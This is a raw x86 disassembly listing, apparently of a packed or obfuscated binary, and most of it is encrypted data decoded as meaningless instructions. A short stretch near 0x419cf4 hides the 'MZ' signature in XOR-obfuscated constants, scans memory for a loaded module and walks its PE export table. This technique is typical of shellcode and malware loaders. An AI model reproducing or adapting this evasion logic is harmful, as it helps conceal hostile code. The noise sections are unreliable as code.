  419cae:	or     BYTE PTR [edx],ch
  419cb0:	xchg   ebp,eax
  419cb1:	xchg   ebx,eax
  419cb2:	adc    BYTE PTR [edx],0x18
  419cb5:	pusha  
  419cb6:	mov    ecx,esp
  419cb8:	dec    ebx
  419cb9:	or     BYTE PTR ds:[eax+0x47],ch
  419cbd:	loope  0x419cb1
  419cbf:	pop    ss
  419cc0:	loope  0x419c75
  419cc2:	adc    eax,0xbaf483d9
  419cc7:	cdq    
  419cc8:	daa    
  419cc9:	and    dl,BYTE PTR ds:0x13eceef9
  419ccf:	fisttp WORD PTR [edx-0x5b]
  419cd2:	xor    al,0xc2
  419cd4:	cmp    DWORD PTR [ebx+0x5f],edx
  419cd7:	or     al,0xfa
  419cd9:	or     DWORD PTR ds:0x25ce4b39,ecx
  419cdf:	loope  0x419cc6
  419ce1:	cmp    ebx,DWORD PTR [edi+0x340d591a]
  419ce7:	div    BYTE PTR [edi+0x6d]
  419cea:	xchg   ebp,eax
  419ceb:	ror    BYTE PTR [ebx+0x7d8bd85d],1
  419cf1:	fsub   QWORD PTR [ebx]
  419cf3:	(bad)  
  419cf4:	mov    esi,0xa147
  419cf9:	xor    bx,si
  419cfc:	mov    esi,0x4133
  419d01:	add    bx,si
  419d04:	cmp    WORD PTR [eax],bx
  419d07:	je     0x419d51
  419d0d:	mov    edi,DWORD PTR [ebp-0x10]
  419d10:	xor    edi,ecx
  419d12:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  419d19:	mov    DWORD PTR [ebp-0x24],0xffffffff
  419d20:	mov    ebx,0xffcd8d06
  419d25:	sub    ebx,edi
  419d27:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  419d2e:	add    eax,ebx
  419d30:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  419d37:	mov    edi,DWORD PTR [ebp-0x28]
  419d3a:	mov    ebx,DWORD PTR [ebp-0x24]
  419d3d:	mov    ebx,0xa147
  419d42:	xor    di,bx
  419d45:	add    di,si
  419d48:	cmp    WORD PTR [eax],di
  419d4b:	jne    0x419d0d
  419d51:	mov    edi,DWORD PTR [ebp-0x14]
  419d54:	mov    edi,DWORD PTR [edi]
  419d56:	mov    ebx,DWORD PTR [eax+0x3c]
  419d59:	lea    edi,[ebx+edi*8+0x78]
  419d5d:	mov    edi,DWORD PTR [edi+eax*1]
  419d60:	mov    DWORD PTR [ebp-0x18],edi
  419d63:	mov    edi,DWORD PTR [ebp+0x8]
  419d66:	xor    edi,ecx
  419d68:	add    edi,edx
  419d6a:	mov    DWORD PTR [ebp-0x1c],edi
  419d6d:	mov    edi,DWORD PTR [ebp+0x8]
  419d70:	xor    edi,ecx
  419d72:	jmp    0x41c0fe
  419d77:	dec    ecx
  419d78:	mov    edi,0x37790f77
  419d7d:	imul   ebx,ecx,0x2d995a11
  419d83:	mov    ebp,0xf558bbe3
  419d88:	fnstsw WORD PTR [edx+0x7b]
  419d8b:	call   0x68bd192c
  419d90:	pop    ds
  419d91:	jle    0x419db8
  419d93:	sti    
  419d94:	sti    
  419d95:	rcl    DWORD PTR [esi],0x42
  419d98:	adc    ebx,DWORD PTR [ebp+0x1]
  419d9b:	sub    dh,dl
  419d9d:	jge    0x419dc3
  419d9f:	mov    eax,ds:0x2e63b9bf
  419da4:	ds fucomip st,st(5)
  419da7:	and    eax,0xc55484e3
  419dac:	xor    edi,esp
  419dae:	xchg   ebp,eax
  419daf:	dec    edx
  419db0:	xchg   BYTE PTR gs:0xbc7d61,ah
  419db7:	(bad)  
  419db8:	pop    ecx
  419db9:	mov    dl,0x3
  419dbb:	cmp    BYTE PTR [ebx-0x60],ah
  419dbe:	inc    ebp
  419dbf:	icebp  
  419dc0:	out    dx,eax
  419dc1:	rcl    BYTE PTR [esi],cl
  419dc3:	xchg   esi,eax
  419dc4:	aaa    
  419dc5:	(bad)  
  419dc6:	adc    cl,BYTE PTR [ecx+0x22]
  419dc9:	xchg   esi,eax
  419dca:	(bad)  
  419dcb:	sti    
  419dcc:	and    eax,0xa5d6ffda
  419dd1:	add    al,dl
  419dd3:	cmp    ch,BYTE PTR [edx]
  419dd5:	mov    eax,ds:0x9f8c47a1
  419dda:	mov    cl,0x8e
  419ddc:	sbb    al,0xb8
  419dde:	test   eax,0x8340e4de
  419de3:	xchg   ecx,eax
  419de4:	lods   eax,DWORD PTR ds:[esi]
  419de5:	iret   
  419de6:	das    
  419de7:	mov    dl,BYTE PTR [edi]
  419de9:	imul   eax,DWORD PTR [ebx+esi*4],0x13
  419ded:	ret    
  419dee:	aas    
  419def:	hlt    
  419df0:	ret    0x41b3
  419df3:	xor    cl,BYTE PTR [ecx+0x2b]
  419df6:	xor    DWORD PTR [esi-0x1e],0x57
  419dfa:	ja     0x419e31
  419dfc:	mov    ch,0xd4
  419dfe:	sti    
  419dff:	and    al,0x6
  419e01:	and    dh,bl
  419e03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e04:	mov    DWORD PTR [ebx],edx
  419e06:	in     al,dx
  419e07:	dec    edx
  419e08:	in     al,dx
  419e09:	dec    edx
  419e0a:	jge    0x419dd1
  419e0c:	mov    edx,0xc043d043
  419e11:	cmp    al,0xa5
  419e13:	outs   dx,BYTE PTR ds:[esi]
  419e14:	(bad)  
  419e15:	push   esp
  419e16:	add    BYTE PTR [eax+ebx*4],ah
  419e19:	push   0xb
  419e1b:	ss fsub st,st(3)
  419e1e:	je     0x419dee
  419e20:	sub    BYTE PTR [edi+0x7b],bl
  419e23:	adc    eax,0x3e3d77b2
  419e28:	jb     0x419e69
  419e2a:	shl    DWORD PTR [edx+0x59289c25],0xd4
  419e31:	fcom   QWORD PTR [edx+0x441e51c0]
  419e37:	adc    edi,DWORD PTR [edx]
  419e39:	sti    
  419e3a:	mov    al,ds:0x95c95d64
  419e3f:	sub    BYTE PTR [ebp+0x29],dl
  419e42:	cmp    ecx,eax
  419e44:	je     0x419e66
  419e46:	xchg   edi,eax
  419e47:	arpl   WORD PTR [edx-0x1debde4],sp
  419e4d:	fcomi  st,st(2)
  419e4f:	pop    esp
  419e50:	inc    eax
  419e51:	xchg   ebp,eax
  419e52:	adc    ebx,DWORD PTR [ebx+0x82cea9d]
  419e58:	inc    esp
  419e59:	adc    ch,cl
  419e5b:	pop    ecx
  419e5c:	imul   ebx,DWORD PTR es:[esi],0x6876771a
  419e63:	sbb    DWORD PTR [esi+0x2234972e],esp
  419e69:	shr    bl,0x1d
  419e6c:	icebp  
  419e6d:	jecxz  0x419dfd
  419e6f:	push   esp
  419e70:	adc    BYTE PTR [di-0x7b],0xf0
  419e75:	inc    ebp
  419e76:	hlt    
  419e77:	adc    eax,0xc0f54469
  419e7c:	std    
  419e7d:	iret   
  419e7e:	pop    eax
  419e7f:	push   ss
  419e80:	push   eax
  419e81:	inc    esp
  419e82:	ss inc esp
  419e84:	or     bh,dh
  419e86:	inc    ecx
  419e87:	push   0x823781be
  419e8c:	mov    ah,0x5e
  419e8e:	inc    esi
  419e8f:	sub    ebp,eax
  419e91:	or     eax,0x57
  419e94:	push   esi
  419e95:	lea    esp,[ecx]
  419e97:	sti    
  419e98:	dec    esi
  419e99:	(bad)  
  419e9a:	pop    ebp
  419e9b:	ja     0x419ebb
  419e9d:	sub    al,0x82
  419e9f:	mov    ah,0xf3
  419ea1:	push   ds
  419ea2:	lods   eax,DWORD PTR ds:[esi]
  419ea3:	inc    edx
  419ea4:	and    DWORD PTR gs:[ecx],esp
  419ea7:	xchg   ecx,eax
  419ea8:	pushf  
  419ea9:	sbb    al,BYTE PTR [edi+0x495b9141]
  419eaf:	rcr    ebp,1
  419eb1:	call   0x46cb4535
  419eb6:	repnz mov dl,bh
  419eb9:	pusha  
  419eba:	outs   dx,BYTE PTR ds:[esi]
  419ebb:	mov    esi,0xad89011b
  419ec0:	inc    ecx
  419ec1:	xor    al,0xfc
  419ec3:	adc    BYTE PTR [esi+0xd],cl
  419ec6:	popf   
  419ec7:	in     al,dx
  419ec8:	sti    
  419ec9:	pop    edi
  419eca:	cmp    edx,eax
  419ecc:	xchg   edx,eax
  419ecd:	jmp    0x419ec0
  419ecf:	mov    ebx,0x2f7097a2
  419ed4:	shl    BYTE PTR [esi+eiz*8+0x22153857],1
  419edb:	inc    edi
  419edc:	sbb    dh,BYTE PTR [ecx-0x14]
  419edf:	sbb    eax,0x39f0879c
  419ee4:	mov    esi,0x5f2734ed
  419ee9:	lock sahf 
  419eeb:	fistp  QWORD PTR [ebx+edi*8-0x5c]
  419eef:	sub    bh,dl
  419ef1:	or     bh,0xf7
  419ef4:	jecxz  0x419e7b
  419ef6:	aam    0x67
  419ef8:	aas    
  419ef9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419efa:	push   ebx
  419efb:	test   al,0xa6
  419efd:	cmp    al,0x48
  419eff:	js     0x419efa
  419f01:	or     edx,esi
  419f03:	jmp    0x419eac
  419f05:	into   
  419f06:	lock pop ebp
  419f08:	ret    
  419f09:	xchg   edx,eax
  419f0a:	retf   
  419f0b:	test   BYTE PTR [edi-0x2d],bh
  419f0e:	(bad)  
  419f0f:	int3   
  419f10:	mov    bl,0x2f
  419f12:	jmp    0xa248:0x842e56ce
  419f19:	adc    al,0xbd
  419f1b:	outs   dx,BYTE PTR ds:[esi]
  419f1c:	mov    ?,esp
  419f1e:	out    0x5a,ax
  419f21:	xchg   dl,ch
  419f23:	pop    esp
  419f24:	out    0x2a,al
  419f26:	mov    dl,BYTE PTR [ecx+edx*4+0x6f]
  419f2a:	(bad)  
  419f2b:	push   eax
  419f2c:	or     DWORD PTR [ebp+0xd],ecx
  419f2f:	test   DWORD PTR [ebx+0x6bf154a4],edx
  419f35:	cld    
  419f36:	cmp    al,0x9c
  419f38:	dec    ebp
  419f39:	or     eax,0x6d52dadc
  419f3e:	cmp    eax,0x43c2c3b5
  419f43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f44:	inc    esp
  419f45:	or     esi,edi
  419f47:	(bad)  
  419f48:	not    DWORD PTR [ecx-0x663343bb]
  419f4e:	aas    
  419f4f:	out    0xed,eax
  419f51:	in     al,0xd0
  419f53:	add    ecx,edi
  419f55:	loope  0x419eec
  419f57:	test   al,0x78
  419f59:	syscall 
  419f5b:	ins    BYTE PTR es:[edi],dx
  419f5c:	add    BYTE PTR [eax+eiz*8+0x7ef1cb3c],ch
  419f63:	les    ebp,FWORD PTR [esi]
  419f65:	pop    eax
  419f66:	adc    al,0x84
  419f68:	xchg   DWORD PTR [edx],esp
  419f6a:	xor    DWORD PTR [ecx],0xa902826d
  419f70:	push   es
  419f71:	(bad)  
  419f72:	jmp    0xed72b865
  419f77:	push   ebx
  419f78:	aad    0xbd
  419f7a:	sbb    al,0xc4
  419f7c:	enter  0x14b6,0x34
  419f80:	push   0x191a558c
  419f85:	mov    esi,0x49160050
  419f8a:	(bad)  
  419f8c:	outs   dx,DWORD PTR ds:[esi]
  419f8d:	call   0xb5d6:0x11d22676
  419f94:	adc    eax,0x5fdbd100
  419f99:	adc    DWORD PTR [ecx-0x4ea1ab16],ebp
  419f9f:	call   0xa66a:0x295302ae
  419fa6:	jne    0x41a00c
  419fa8:	fdivr  QWORD PTR [ecx+0x56]
  419fab:	out    0xf0,al
  419fad:	(bad)  
  419fae:	repnz setg cl
  419fb2:	jge    0x419f4d
  419fb4:	push   ecx
  419fb5:	xchg   BYTE PTR [edx],cl
  419fb7:	sub    al,BYTE PTR [edx]
  419fb9:	mov    ds:0x7d9438bb,al
  419fbe:	lods   eax,DWORD PTR ds:[esi]
  419fbf:	mov    eax,DWORD PTR [eax]
  419fc1:	and    al,ch
  419fc3:	mov    ds:0x8b4e1271,eax
  419fc8:	add    eax,0x7a45f196
  419fcd:	in     eax,0x34
  419fcf:	fiadd  WORD PTR ds:0x39520ff9
  419fd5:	push   ebp
  419fd6:	adc    ah,BYTE PTR [ecx-0x68bf7152]
  419fdc:	int    0xe5
  419fde:	ins    BYTE PTR es:[edi],dx
  419fdf:	cmp    eax,0x5c72208e
  419fe4:	icebp  
  419fe5:	mov    bh,0x1b
  419fe7:	or     BYTE PTR [ecx+0x341d9e54],cl
  419fed:	test   edx,eax
  419fef:	lods   al,BYTE PTR ds:[esi]
  419ff0:	int    0x5b
  419ff2:	sub    bh,BYTE PTR [edi]
  419ff4:	in     eax,0x9e
  419ff6:	(bad)  
  419ff7:	or     bl,BYTE PTR [ecx+0x1c6f372e]
  419ffd:	mov    eax,ds:0x7bc1ead5
  41a002:	mov    esp,DWORD PTR [ebx-0x7b]
  41a005:	aam    0x5f
  41a007:	add    bh,BYTE PTR [ebx-0x776dccf0]
  41a00d:	int3   
  41a00e:	push   ebx
  41a00f:	aam    0x81
  41a011:	fs dec edi
  41a013:	cdq    
  41a014:	sub    eax,0xd4815756
  41a019:	ss cld 
  41a01b:	(bad)  
  41a01c:	sti    
  41a01d:	inc    ebp
  41a01e:	push   esi
  41a01f:	mov    ecx,0xe1e4fbc3
  41a024:	jmp    0xd7ba:0x4a2d18d6
  41a02b:	aas    
  41a02c:	xor    esi,ebp
  41a02e:	test   BYTE PTR ds:0x64980df2,cl
  41a034:	fs data16 clc 
  41a037:	daa    
  41a038:	pop    eax
  41a039:	test   al,0x6d
  41a03b:	test   eax,0x6c5dfa84
  41a040:	(bad)  
  41a042:	sub    al,BYTE PTR [ebx-0x40eb49d7]
  41a048:	sbb    dh,BYTE PTR [edx+0x755f92f8]
  41a04e:	(bad)  
  41a04f:	enter  0x7ecf,0xec
  41a053:	sub    ebp,DWORD PTR ds:0x435bab01
  41a059:	cmp    eax,0x6b
  41a05c:	jmp    0x41a02b
  41a05e:	xlat   BYTE PTR ds:[ebx]
  41a05f:	and    bh,BYTE PTR es:[esi-0x53910805]
  41a066:	xlat   BYTE PTR ds:[ebx]
  41a067:	cmp    eax,0xc445d7fb
  41a06c:	mov    cl,al
  41a06e:	lea    eax,[eax]
  41a070:	xor    bl,BYTE PTR [esi-0x5c4d37f5]
  41a076:	sbb    dh,BYTE PTR [edx]
  41a078:	loope  0x41a0e3
  41a07a:	sbb    ebp,DWORD PTR [edi-0x75]
  41a07d:	pop    es
  41a07e:	scas   eax,DWORD PTR es:[edi]
  41a07f:	repnz mov WORD PTR [eax+edi*1+0x7f],cs
  41a084:	ins    DWORD PTR es:[edi],dx
  41a085:	mov    ebp,0xcf2b7cb2
  41a08a:	shl    esp,1
  41a08c:	sar    DWORD PTR [esi],cl
  41a08e:	lahf   
  41a08f:	mov    ah,0xf7
  41a091:	sub    ebx,DWORD PTR gs:[edi]
  41a094:	shl    DWORD PTR [edi-0x8],1
  41a097:	or     esi,esp
  41a099:	and    eax,0x3ede168e
  41a09e:	mov    DWORD PTR ds:0xcb1c39ff,edi
  41a0a4:	retf   
  41a0a5:	mov    edi,0x29eebcd2
  41a0aa:	inc    eax
  41a0ab:	enter  0xc89a,0x8f
  41a0af:	mov    DWORD PTR [ebx+eiz*8-0x3b136f83],ecx
  41a0b6:	xor    ch,BYTE PTR [esi]
  41a0b8:	cli    
  41a0b9:	arpl   WORD PTR [ecx-0x69e1315c],di
  41a0bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0c0:	je     0x41a117
  41a0c2:	or     al,0xe2
  41a0c4:	mov    ebx,0xcfa8fb9e
  41a0c9:	adc    esp,DWORD PTR [esi+0x3d]
  41a0cc:	gs inc esp
  41a0ce:	std    
  41a0cf:	into   
  41a0d0:	sti    
  41a0d1:	in     eax,dx
  41a0d2:	add    cl,BYTE PTR [ecx]
  41a0d4:	mov    eax,ds:0xa2603e8e
  41a0d9:	push   bx
  41a0db:	and    bh,BYTE PTR [ecx+edx*1+0x6cc9ebaa]
  41a0e2:	xor    BYTE PTR [edx],bh
  41a0e4:	add    al,0x6
  41a0e6:	dec    edi
  41a0e7:	sahf   
  41a0e8:	int3   
  41a0e9:	in     eax,dx
  41a0ea:	scas   al,BYTE PTR es:[edi]
  41a0eb:	sbb    ebp,DWORD PTR ds:0x7b1c77c8
  41a0f1:	mov    dl,0x7f
  41a0f3:	mov    eax,0x8c8ecc0a
  41a0f8:	fild   WORD PTR [ebx-0x23]
  41a0fb:	out    0x76,eax
  41a0fd:	adc    ebp,ebx
  41a0ff:	sub    eax,0xaa6e5f2f
  41a104:	xchg   esp,eax
  41a105:	sbb    BYTE PTR gs:[ebx+0x1f],ch
  41a109:	ins    DWORD PTR es:[edi],dx
  41a10a:	mov    edi,0x3bc9fa61
  41a10f:	mov    edi,0x9ac77ef7
  41a114:	jle    0x41a175
  41a116:	cli    
  41a117:	push   ds
  41a118:	js     0x41a0ae
  41a11a:	add    DWORD PTR [edx],esi
  41a11c:	mov    esi,0x437965d6
  41a121:	xchg   ecx,eax
  41a122:	(bad)  
  41a123:	std    
  41a124:	pop    edx
  41a125:	fdiv   QWORD PTR [edx+edi*8+0x14c44a2d]
  41a12c:	add    edx,ebx
  41a12e:	mov    eax,ds:0xd2167798
  41a133:	and    al,0xc5
  41a135:	mov    ds:0xf20889a5,ax
  41a13b:	add    ebp,DWORD PTR [edx]
  41a13d:	sub    BYTE PTR [ebp-0x7d70b7d9],al
  41a143:	mov    ah,0x6c
  41a145:	add    al,0xe4
  41a147:	add    edi,DWORD PTR [ebx-0x6d]
  41a14a:	pop    esi
  41a14b:	push   0x72
  41a14d:	loopne 0x41a1b9
  41a14f:	mov    ds:0x7baf4504,al
  41a154:	jecxz  0x41a1a2
  41a156:	and    eax,0x7786a679
  41a15b:	pop    esi
  41a15c:	cs or  eax,0x3a59110c
  41a162:	pop    ebx
  41a163:	repz cmp ah,BYTE PTR [ecx]
  41a166:	in     eax,0xaf
  41a168:	out    dx,eax
  41a169:	mov    eax,ds:0x6b0c5fa7
  41a16e:	lds    esi,FWORD PTR [ecx-0x2e047170]
  41a174:	data16 repz mov cl,0xce
  41a178:	cdq    
  41a179:	pop    edi
  41a17a:	cmp    eax,0xe2593c87
  41a17f:	aas    
  41a180:	dec    esi
  41a181:	sbb    eax,0xffffff85
  41a184:	(bad)  
  41a185:	test   al,0x84
  41a187:	lea    eax,[eax+0x14]
  41a18a:	stos   BYTE PTR es:[edi],al
  41a18b:	mov    esi,0xbe156019
  41a190:	outs   dx,BYTE PTR ds:[esi]
  41a191:	sar    BYTE PTR [ebp+ebx*2+0x78],1
  41a195:	mov    dh,0x9d
  41a197:	or     al,0xa9
  41a199:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a19a:	adc    ecx,esi
  41a19c:	pop    esp
  41a19d:	jmp    0x8c88:0x4e69314e
  41a1a4:	(bad)  
  41a1a5:	lock mov esp,DWORD PTR [ecx+0x66]
  41a1a9:	cli    
  41a1aa:	data16 scas al,BYTE PTR es:[edi]
  41a1ac:	inc    edi
  41a1ad:	std    
  41a1ae:	rol    DWORD PTR [edx+0x300251a1],0xe2
  41a1b5:	xchg   ecx,eax
  41a1b6:	push   esi
  41a1b7:	sub    eax,0x374b9817
  41a1bc:	pop    esi
  41a1bd:	data16 fild QWORD PTR [edx-0x6a8e3bf6]
  41a1c4:	aaa    
  41a1c5:	jae    0x41a242
  41a1c7:	test   eax,0x892bedf4
  41a1cc:	leave  
  41a1cd:	cld    
  41a1ce:	mov    ds,edi
  41a1d0:	pop    ecx
  41a1d1:	addr16 sub eax,0x1b2bbaf4
  41a1d7:	sti    
  41a1d8:	dec    edi
  41a1d9:	push   0xfffffff7
  41a1db:	push   0x25
  41a1dd:	xchg   esi,eax
  41a1de:	or     ebx,DWORD PTR [ebx]
  41a1e0:	mov    ds:0x467b708a,eax
  41a1e5:	jle    0x41a258
  41a1e7:	repnz push dx
  41a1ea:	iret   
  41a1eb:	jbe    0x41a212
  41a1ed:	xchg   ecx,eax
  41a1ee:	mul    BYTE PTR [ecx]
  41a1f0:	loope  0x41a18c
  41a1f2:	adc    edi,DWORD PTR [ebx+esi*1]
  41a1f5:	and    al,0x86
  41a1f7:	(bad)  
  41a1f8:	push   esi
  41a1f9:	shr    BYTE PTR [edi-0x7c],1
  41a1fc:	sub    BYTE PTR [eax-0x1b4578a1],bl
  41a202:	and    bl,BYTE PTR [edx-0x2026a5e9]
  41a208:	sub    DWORD PTR [ecx],ecx
  41a20a:	mov    al,cl
  41a20c:	out    0xb,al
  41a20e:	mov    WORD PTR [esi],ds
  41a210:	lahf   
  41a211:	dec    esi
  41a212:	js     0x41a21d
  41a214:	inc    edx
  41a215:	jnp    0x41a1e0
  41a217:	arpl   WORD PTR [eax+0x6bee58bc],di
  41a21d:	je     0xf6dc984e
  41a223:	test   edi,edi
  41a225:	dec    ecx
  41a226:	add    ecx,esi
  41a228:	push   edi
  41a229:	xchg   ecx,eax
  41a22a:	aam    0x2f
  41a22c:	int3   
  41a22d:	enter  0xc4ec,0x37
  41a231:	iret   
  41a232:	out    0x94,al
  41a234:	sbb    al,0x50
  41a236:	idiv   BYTE PTR [esi]
  41a238:	(bad)  
  41a239:	jmp    0x454e:0x6e9e57c7
  41a240:	xchg   edi,eax
  41a241:	retf   
  41a242:	mov    ecx,0xa7ca1f36
  41a247:	sub    bl,dh
  41a249:	test   DWORD PTR [esi+0x63],0x433fece9
  41a250:	loop   0x41a272
  41a252:	add    ah,BYTE PTR [esi+edi*4]
  41a255:	loope  0x41a240
  41a257:	js     0x41a257
  41a259:	xchg   DWORD PTR [ecx+edx*4-0x2608918],esp
  41a260:	cmp    esp,DWORD PTR [edi+0x557bde5b]
  41a266:	(bad)  
  41a268:	in     eax,0xc6
  41a26a:	sahf   
  41a26b:	mov    edi,0xeef51d80
  41a270:	cmp    DWORD PTR [esi+0x3d],ebp
  41a273:	add    DWORD PTR [ebx+0x5f],ebx
  41a276:	or     BYTE PTR [ebp-0x30],bl
  41a279:	xor    eax,0x23a48782
  41a27e:	xchg   esp,eax
  41a27f:	call   0x346e6793
  41a284:	repnz fucomip st,st(0)
  41a287:	js     0x41a2c0
  41a289:	and    eax,0x334e6015
  41a28e:	bound  edi,QWORD PTR [ebx+0x71]
  41a291:	test   al,0xa0
  41a293:	into   
  41a294:	jl     0x41a304
  41a296:	stc    
  41a297:	dec    ebp
  41a298:	(bad)  
  41a299:	adc    dl,ch
  41a29b:	or     eax,DWORD PTR [edi]
  41a29d:	dec    edx
  41a29e:	pop    ds
  41a29f:	sbb    cl,0xb1
  41a2a2:	sar    DWORD PTR [eax+0x32451157],0xe7
  41a2a9:	lods   al,BYTE PTR ds:[esi]
  41a2aa:	sbb    esp,ebx
  41a2ac:	push   es
  41a2ad:	frstor [ecx-0x7e]
  41a2b0:	lea    edx,[ebx-0x446b7f1c]
  41a2b6:	ficom  DWORD PTR [edx]
  41a2b8:	ror    edi,0xd
  41a2bb:	lea    ebx,[edx+0x54146b98]
  41a2c1:	dec    esi
  41a2c2:	aam    0x6c
  41a2c4:	sub    bl,bl
  41a2c6:	xchg   esp,eax
  41a2c7:	pop    es
  41a2c8:	mov    bh,0x53
  41a2ca:	test   al,0x9e
  41a2cc:	(bad)  
  41a2cd:	call   FWORD PTR [ebx+0x7821fb6d]
  41a2d3:	or     eax,0x10fe4c53
  41a2d8:	inc    esi
  41a2d9:	and    BYTE PTR [ecx-0x4e],bl
  41a2dc:	dec    esi
  41a2dd:	jecxz  0x41a35e
  41a2df:	arpl   WORD PTR [edx],ax
  41a2e1:	call   0x42f7:0x7561aa7
  41a2e8:	sahf   
  41a2e9:	and    ah,BYTE PTR [ecx+0x41]
  41a2ec:	test   esp,0x71e567f2
  41a2f2:	push   edx
  41a2f3:	nop
  41a2f4:	inc    esp
  41a2f5:	jb     0x41a2c4
  41a2f7:	mov    ch,0xec
  41a2f9:	and    DWORD PTR [esi+0x67],eax
  41a2fc:	mov    dl,0x16
  41a2fe:	cmp    edx,DWORD PTR [edx]
  41a300:	ja     0x41a2f1
  41a302:	xor    BYTE PTR [ebx-0x8],0x5
  41a306:	je     0x41a2ba
  41a308:	retf   0xd2f0
  41a30b:	stos   DWORD PTR es:[edi],eax
  41a30c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a30d:	pop    ebx
  41a30e:	gs into 
  41a310:	int    0xb1
  41a312:	xor    edx,edi
  41a314:	cmp    al,0xab
  41a316:	xor    dh,BYTE PTR [ebx-0x4642bf5b]
  41a31c:	clc    
  41a31d:	into   
  41a31e:	jae    0x41a36a
  41a320:	out    0xb6,al
  41a322:	push   ds
  41a323:	sub    DWORD PTR [eax+0x23b234fb],0x2cab404f
  41a32d:	in     al,0xa4
  41a32f:	mov    ch,0x5e
  41a331:	enter  0x6f7e,0x60
  41a335:	jbe    0x41a2dc
  41a337:	les    ecx,FWORD PTR [esi-0x46d3b335]
  41a33d:	sbb    bh,ah
  41a33f:	sbb    al,0x8d
  41a341:	sbb    ecx,DWORD PTR ds:0x91910b8b
  41a347:	inc    ecx
  41a348:	jns    0x41a33c
  41a34a:	dec    ecx
  41a34b:	outs   dx,BYTE PTR ds:[esi]
  41a34c:	bound  edx,QWORD PTR [eax+0x45]
  41a34f:	inc    ebp
  41a350:	xor    al,0x5e
  41a352:	xchg   ebp,eax
  41a353:	adc    BYTE PTR ss:[edi],0x64
  41a357:	je     0x41a33e
  41a359:	(bad)  
  41a35a:	pop    ds
  41a35b:	rcr    DWORD PTR [esi],cl
  41a35d:	adc    dl,BYTE PTR [ecx+0x63b59ef9]
  41a363:	xor    al,0x5c
  41a365:	aad    0xf7
  41a367:	mov    ecx,0x1deee10b
  41a36c:	in     eax,0x15
  41a36e:	jp     0x41a329
  41a370:	aaa    
  41a371:	fiadd  WORD PTR [ebx]
  41a373:	shl    DWORD PTR [ecx+0x5b06886f],cl
  41a379:	mov    bh,0xa
  41a37b:	ins    DWORD PTR es:[edi],dx
  41a37c:	inc    ebp
  41a37d:	mov    dh,0xfc
  41a37f:	mov    eax,0x365b15fd
  41a384:	repnz (bad) 
  41a386:	pushf  
  41a387:	add    al,0xb5
  41a389:	int3   
  41a38a:	sbb    eax,0xecf22f81
  41a38f:	imul   ebx,DWORD PTR [ebx-0x13],0x4
  41a393:	shl    BYTE PTR [ecx+0x129177b],cl
  41a399:	or     eax,0xf667d882
  41a39e:	mov    edi,0xadf36ab1
  41a3a3:	mov    ah,0x22
  41a3a5:	mov    eax,ds:0x4809b98
  41a3aa:	or     BYTE PTR [edi-0x6b],0xab
  41a3ae:	mov    ds:0xf8c6e82f,al
  41a3b3:	xor    al,0x1f
  41a3b5:	cli    
  41a3b6:	leave  
  41a3b7:	fdivr  DWORD PTR [ecx+0x33eb9a8c]
  41a3bd:	jmp    0x8696cb53
  41a3c2:	ficomp WORD PTR [eax+0x4db9ae43]
  41a3c8:	sbb    esp,DWORD PTR [ecx-0x42]
  41a3cb:	div    ecx
  41a3cd:	and    DWORD PTR [edi-0x5b7f45c8],ebp
  41a3d3:	stc    
  41a3d4:	int    0x8
  41a3d6:	aam    0x3d
  41a3d8:	ret    
  41a3d9:	dec    ecx
  41a3da:	pusha  
  41a3db:	mov    WORD PTR [eax+ebx*8+0x1d],cs
  41a3df:	push   cs
  41a3e0:	and    ebp,DWORD PTR [ebx-0x75]
  41a3e3:	push   0x1c32085b
  41a3e8:	loop   0x41a39c
  41a3ea:	outs   dx,DWORD PTR ds:[esi]
  41a3eb:	out    dx,eax
  41a3ec:	cld    
  41a3ed:	adc    cl,bl
  41a3ef:	inc    ebx
  41a3f0:	not    DWORD PTR [ebx]
  41a3f2:	sahf   
  41a3f3:	add    al,0xaf
  41a3f5:	dec    ecx
  41a3f6:	mov    esp,DWORD PTR [esi-0x60da45bf]
  41a3fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3fd:	push   cs
  41a3fe:	jno    0x41a385
  41a400:	or     DWORD PTR [eax+eax*1-0x7294ea8],edi
  41a407:	xor    DWORD PTR [eax+ecx*8+0x15ceb00f],esi
  41a40e:	les    edi,FWORD PTR [edx]
  41a410:	mov    ds:0x234c0856,eax
  41a415:	dec    ebx
  41a416:	cli    
  41a417:	aam    0x58
  41a419:	outs   dx,DWORD PTR ds:[esi]
  41a41a:	out    0xcd,eax
  41a41c:	sbb    al,0x7e
  41a41e:	sbb    eax,0x86527639
  41a423:	popa   
  41a424:	inc    ebx
  41a425:	mov    esi,0x46a55cb9
  41a42a:	mov    ebx,0x33a16324
  41a42f:	nop
  41a430:	mov    dh,0x81
  41a432:	(bad)  
  41a434:	mov    esp,ds
  41a436:	add    esi,ebp
  41a438:	and    al,0x6f
  41a43a:	popf   
  41a43b:	and    BYTE PTR [esi],ah
  41a43d:	test   DWORD PTR [edi],esp
  41a43f:	sbb    eax,0x92f2d67b
  41a444:	xlat   BYTE PTR ds:[ebx]
  41a446:	(bad)  
  41a447:	js     0x41a42f
  41a449:	out    0xc9,eax
  41a44b:	jno    0x41a470
  41a44d:	cmp    DWORD PTR [ecx-0x17],ebx
  41a450:	xor    al,0xd2
  41a452:	aas    
  41a453:	mov    ebp,0x5dfd55c7
  41a458:	lds    eax,FWORD PTR [esi+0x10]
  41a45b:	and    BYTE PTR [ecx+eax*1],al
  41a45e:	int    0xa4
  41a460:	aad    0x6d
  41a462:	bound  ebp,QWORD PTR [eax+0x9049d5e]
  41a468:	push   ebx
  41a469:	in     al,0x93
  41a46b:	loope  0x41a4ea
  41a46d:	clc    
  41a46e:	jl     0x41a402
  41a470:	add    al,0xed
  41a472:	scas   eax,DWORD PTR es:[edi]
  41a473:	(bad)  
  41a474:	and    edi,DWORD PTR [edi+0x2d5bc258]
  41a47a:	xor    BYTE PTR [esi-0xe],ch
  41a47d:	dec    eax
  41a47e:	mov    al,dh
  41a480:	pop    es
  41a481:	sub    eax,DWORD PTR [eax-0x3f282385]
  41a487:	inc    edi
  41a488:	xchg   esi,eax
  41a489:	push   ds
